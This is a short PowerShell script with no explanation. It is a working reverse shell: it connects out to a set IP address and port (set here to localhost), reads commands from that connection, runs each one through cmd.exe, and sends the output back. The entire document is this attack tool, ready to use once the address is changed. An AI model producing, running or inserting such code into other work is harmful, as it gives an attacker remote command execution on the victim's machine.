$ip = "127.0.0.1"
$port = 8080

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($client.Connected) {
    $cmd = $reader.ReadLine()
    if ($cmd -eq $null) { break }

    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "cmd.exe"
    $psi.Arguments = "/c $cmd"
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false

    $p = [System.Diagnostics.Process]::Start($psi)
    $p.WaitForExit()

    $out = $p.StandardOutput.ReadToEnd()
    $err = $p.StandardError.ReadToEnd()
    $writer.WriteLine(($out + $err) + "END_OUTPUT")

    $writer.Flush()
}
